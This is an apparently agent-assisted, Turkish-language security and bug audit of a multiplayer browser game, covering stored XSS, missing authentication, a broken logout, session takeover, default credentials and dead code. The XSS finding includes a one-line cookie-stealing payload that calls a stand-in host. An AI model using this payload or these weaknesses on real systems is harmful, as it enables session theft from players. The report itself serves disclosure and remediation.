# ForestBrawl — Doğrulanmış Hata / Eksiklik / Bug Raporu

**Proje:** `C:\Users\muham\OneDrive\Masaüstü\asdasd-main`
**Taranan dosyalar:** `server.js` (8081 satır), `game/play.html` (30.051 satır), `game/index.html`, `game/sw.js`, `game/manifest.json`, `game/admin/*`, kök `index.html`, `render.yaml`, `ecosystem.config.cjs`, `scripts/prepare-build-assets.js`, tüm asset dizinleri.

> **Not:** Bu makinede Node.js kurulu olmadığı için `npm run check` çalıştırılamadı. Sunucu tarafı bulguların satır numaraları doğrudan dosya okunarak teyit edilmiştir.

---

## 🔴 KRİTİK

### 1. Klan adında saklanmış XSS (Stored XSS) — sunucu + istemci zinciri

| Nerede | Durum |
|---|---|
| `server.js:8408` | `clan_create`'de `name` için **hiçbir karakter filtresi yok** — sadece `.trim().slice(0, 20)`. `tag` için `/[^A-Z0-9ÇĞİÖŞÜ]/g` filtresi var, **ad için yok.** |
| `server.js:4030` | `publicClan()` `name`/`tag`/`ownerName`'i ham gönderiyor. |
| `server.js:4047` | `broadcastClanList()` → `io.emit('clan_list', ...)` **tüm oyunculara**. |
| `game/play.html:24555` | `innerHTML` ile render ediliyor; `24558-24561`'de `name`/`ownerName`/`tag` ham basılıyor. |
| `game/play.html` | İçinde `escapeHtml` / `esc()` fonksiyonu **yok** (0 referans). |

**Senaryo:** Bir oyuncu klan adına `<img src=x onerror=fetch('//evil/'+document.cookie)>` yazar. Klan listesi açan **her** oyuncunun tarayıcısında çalışır. Kimlik avı ve oturum çalma mümkün.

---

### 2. Kimlik doğrulamasız tam-dünya sızıntısı (`spectate`)

- `server.js:6880` — `socket.on('spectate')` içinde **hiç kimlik doğrulaması yok**; `io.on('connection')` içinde global `io.use()` auth middleware de **yok**.
- `server.js:6882-6898` — `welcome` ile tüm canlı oyuncu konumları, tüm binalar, tüm moblar ve ödülleri, tüm kaynak HP'leri gönderiliyor.

**Sonuç:** Anonim bağlanan herkes oyuna girmeden tüm dünyayı haritalayabilir (map-hack / oyuncu konum takibi).

---

### 3. Çıkış (logout) çalışmıyor — token 14 gün geçersiz kılınamıyor

- `server.js:1702` `verifyToken()`: önce `sessions.get(token)`'a bakar, bulamazsa HMAC imzasını doğrular ve `1732`'de oturumu **yeniden kaydeder**.
- `server.js:2545` `logout` sadece `sessions.delete(token)` yapar.

**Sonuç:** Çıkışta silinen token, bir sonraki istekte HMAC yoluyla tekrar doğrulanıp `sessions`'e geri yazılıyor. Çalınmış bir token, kullanıcı çıkış yaptıktan sonra bile 14 gün (`AUTH_TOKEN_TTL_MS`, `server.js:711`) geçerli kalıyor.

---

### 4. `guestId` ile oturum / ilerleme ele geçirme

- `server.js:7039-7048` — `join`, istemciden gelen `data.guestId` ile `reconnectSessions` durumunu geri yüklüyor. Sadece `savedAt < 60 sn` ve `hp > 0` kontrolü var; **`socketId` karşılaştırması yok**.
- `server.js:7045-7047` — Kayıtlı kurbanın tüm binalarının `ownerId`'si yeni socket'e yazılıyor.

**Sonuç:** Bir oyuncu, bağlantısı kesilen bir kurbanın `guestId`'siyle bağlanıp onun skor/altın/kaynak/seviyesini ve **tüm yapılarını** devralabilir.

---

### 5. Üretim (production) ayarları gerçekte devre dışı

- `render.yaml` — yalnızca `OWNER_USERNAME`, `OWNER_PASSWORD` (`sync: false`) ve `AUTH_SECRET` (`generateValue: true`). **`NODE_ENV`, `DATABASE_FILE` ve `disk:` bloğu yok.**
- `server.js:712` — `isProduction = (NODE_ENV === 'production')` → Render'da **false** kalıyor.
- `server.js:385-386` — `OWNER_*` yoksa varsayılan `owner` / `admin` kullanılıyor.
- `DEPLOYMENT.md:52-56` — `/var/data` diski bağlamayı söylüyor, ama `render.yaml`'da disk yok.

**Sonuç:** Uygulama, bilinen yalnızca `owner`/`admin` kimlik bilgileriyle sahip paneline açık. Veritabanı kalıcı olmayan diske yazılıyor ve her deploy'da sıfırlanıyor.

---

## 🟠 YÜKSEK

### 6. Ekonomi endpoint'lerinde hız sınırı ve kilit yok

- `server.js:2756` `/api/daily-reward/claim` — kilitsiz check-then-set ve hız sınırı yok → eş zamanlı POST ile **çift ödül**.
- `server.js:2651` `quests/claim`, `2711` `level-reward`, `2811` `invite-claim`, `3026` `creator-claim` — `AUTH_LIMITS` listesinde (`server.js:482-489`) hız sınırı tanımlı değil.
- `server.js:2690` — Misafir quest claim, hiçbir ilerlemeyi doğrulamıyor.

---

### 7. Oda izolasyonu denetimi ölü kod

- `server.js:3992` — `Number(attacker.roomId) !== Number(target.roomId)` kontrolü.
- `server.js:3949` — `roomId` her zaman `room:x,y` biçiminde → `Number()` = `NaN` → `Number.isFinite` **false** → koşul asla doğru olmuyor.
- Aynı desen `server.js:7690`'da tekrarlanıyor.

---

### 8. Sınırsız gzip önbelleği + PM2 512 MB → çökme döngüsü

- `server.js:3472` — `gzipCache` hiç tahliye edilmiyor (tek bir `Map`).
- `ecosystem.config.cjs:10` — `max_memory_restart: '512M'`.

**Sonuç:** Yüzlerce varlık sıkıştırılıp bellekte tutulunca PM2 sunucuyu oyunun ortasında yeniden başlatır.

---

### 9. Yeniden doğuşta anti-replay koruması devre dışı kalıyor

- `server.js:7220` — `respawn` sonrası `player.stateSeq = 0`.
- `game/play.html:24745` / `24795` — `_mpSeq` sıfırlanmadan artmaya devam ediyor.
- `server.js:7255` — daha önce `incomingSeq <= stateSeq && fark < 1000` ise paketi düşürüyordu.

**Sonuç:** Yeniden doğuş, eski paketleri yeniden oynatma korumasını geçici olarak kaldırıyor (paket düşme değil, koruma atlama).

---

## 🟡 EKSİK / ÖLÜ KOD (tamamen çalışmayan sistemler)

### 10. ~1000 satırlık kilavuz (loadout) sistemi istemcide hiç bağlanmamış

- `server.js:4095` `BUILD_ROLES`, `4187` `BUILD_HELMETS`, `WEAPON_DEFINITIONS`, `applyLoadoutStats` (`5157`) — hepsi çalışıyor ve `welcome` ile gönderiliyor (`7123-7129`).
- `game/play.html` — `loadoutCatalog`, `loadout_select`, `roleInfo`, `helmetInfo`, `setInfo`, `weaponInfo` için **sıfır referans**.

**Sonuç:** Tüm rol / kask / premium silah gücü kullanılmıyor.

---

### 11. Parti sistemi tamamen sunucu tarafında

- `server.js:8444+` — `party_create` / `join` / `start` / `leave` işleyicileri ve `party_created` / `joined` / `left` / `update` / `error` / `game_start` yayınları var.
- `game/play.html` — bu olayların işleyicisi **hiçbiri yok** (0 referans). Yalnızca `26782`'de paylaşım linki için rastgele kod üretiliyor.

---

### 12. Erişilemez endpoint'ler ve kırık istemci akışları

- `server.js:2928` — `if (false && requestPath === '/api/invite-event/reset')` → ulaşılamaz.
- `server.js:3141` — `if (false && requestPath === '/api/creator-event/reset')` → ulaşılamaz.
- `server.js:2875` ve `3094` — hemen önce `return true` yapıyor, bu yüzden `2879` ve `3098`'deki `simulate` işleyicileri **erişilemez**.
- `game/index.html:9375` ve `9849` — istemci hâlâ bu `/simulate` endpoint'lerini çağrıyor.

**Sonuç:** Kayıtlı kullanıcı "simulate" butonuna basınca sunucu 404 döner, veri yalnızca `localStorage`'a yazılır; sunucu tarafı `claim` sonrasında başarısız olur. Bu, tarayıcıda silinmiş davetli / video ile ekranda görünen, gerçekte hesapta olmayan bir ilerleme demek.

---

### 13. `updateBounty` tamamen boş bir yer tutucu

- `server.js:5254` — `if (!BOUNTY_EVENT_ENABLED) { currentBountyId = null; return; }`
- `server.js:772` — `BOUNTY_EVENT_ENABLED = false`
- Ama `server.js:6814`'te 2 saniyelik döngüden ve `7139`'da `join`'den çağrılıyor. `7654-7661`'deki ödül mantığı asla çalışmıyor.

---

## ⚪ DOKÜMANTASYON / DEPO UYUŞMAZLIKLARI

### 14. README koddan farklı

| README | Kod |
|---|---|
| "80+ unique mob types" | `server.js:605` `MOB_TYPES` — **18 girdi** |
| "Snow, Swamp, Dark Forest" biyomları | Kodda `forest` / `winter` / `desert` / `lava`. `play.html` `swamp` (35) ve `darkforest` (32) kullanıyor ama **sunucu bunları bilmiyor.** |
| "Leaderboard top 100" | Kodda 50'ye dilimliyor (`1900`, `1963`, `6836`) |
| "12 ranking tiers" | `RANKS` 100 girdi, `RANK_NAMES` sadece 12 (`1073-1074`) |
| "Node.js 24.x" (README) vs `>=22.5.0` (package.json) | Tutarsız |

### 15. Depodaki gereksiz ve hiç sunulmayan dosyalar

- Kökte **586 KB** `index.html` — sunucu `root = path.join(__dirname, 'game')` (`server.js:35`) olduğundan **hiç sunulmuyor**, ölü dosya.
- Kök dizinde **59,6 MB** varlık dizini (`players`, `weapons`, `mobassets`, `tier1-6builds`, `buildassets`...) — çoğu `publicAssetDirs` dışında kalıp sunulmuyor.
- `boss.zip` (1,8 MB), `newmobs.zip` (3,4 MB), `play-debug.png` (210 KB) depoda.
- `scripts/prepare-build-assets.js` üretilen `tier-sprites/*.webp` — `game/play.html:6166` kullanıyor, ama eksik katmanlar sessizce atlanıyor (`prepare-build-assets.js:47-51`), dolayısıyla t1/t2 spike'lar `core` parçası olmadan üretiliyor.

### 16. Service Worker sürüm sapması

- `game/index.html:77` → `sw.js?v=9`; `game/play.html:149` → `sw.js`.
- `APP_SHELL` içinde `./originalicon.png` var; kökte böyle bir dosya yok ama `game/originalicon.png` var ve `game/` kök olduğu için çözümleniyor. Sorun yok, fakat iki sayfa farklı WS URL'si ile kayıt yapıyor — sürüm yükseltmelerinde tutarsızlık riski.

---

## ✅ Ajan iddialarından doğrulanamayıp çıkarılanlar

Bu iddialar kontrol edildi ve **yanlış** çıktı, rapora dahil edilmedi:

1. **"`maxHp=1` hatası"** (`server.js:6990`) — `clampNumber` imzası `(value, fallback, min, max)`; iç değer 1 değil, varsayıldığında 250. Ayrıca `applyLoadoutStats` (`server.js:5179`) `maxHp`'yi `>= 130`'a sabitliyor. Hata yok.
2. **"`syncLivePlayerProgress` diamond harcamasını geri alıyor"** — sadece `score` / `gold` / `kills` için `Math.max` kullanıyor (`server.js:1584-1588`), `diamonds`'e dokunmuyor.
3. **"`stateSeq` sıfırlanınca paketler düşüyor"** — istemcinin `_mpSeq`'si asla sıfırlanmaz, bu yüzden paket düşmüyor (koruma atlanıyor, düşme değil).
4. **"`ownerAudit` prototip kirliliği"** — `...meta` yayılan tek çağrı sabit anahtarlarla (`server.js:2244`); `body`'den gelen anahtarlar yayılmıyor.

---

## Özet tablo

| Seviye | Sayı | Ana başlıklar |
|---|---|---|
| 🔴 Kritik | 5 | Klan XSS, yetkisiz `spectate`, çalışmayan logout, guestId ele geçirme, prod ayarları |
| 🟠 Yüksek | 4 | Hız sınırı yok, ölü oda kontrolü, gzip bellek sızıntısı, anti-replay atlaması |
| 🟡 Eksik | 4 | ~1000 satır bağlanmamış kilavuz, parti sistemi, erişilemez endpoint'ler, `updateBounty` |
| ⚪ Dokümantasyon | 3 | README uyuşmazlığı, ölü 586 KB dosya + 59,6 MB gereksiz asset, katman eksikliği |
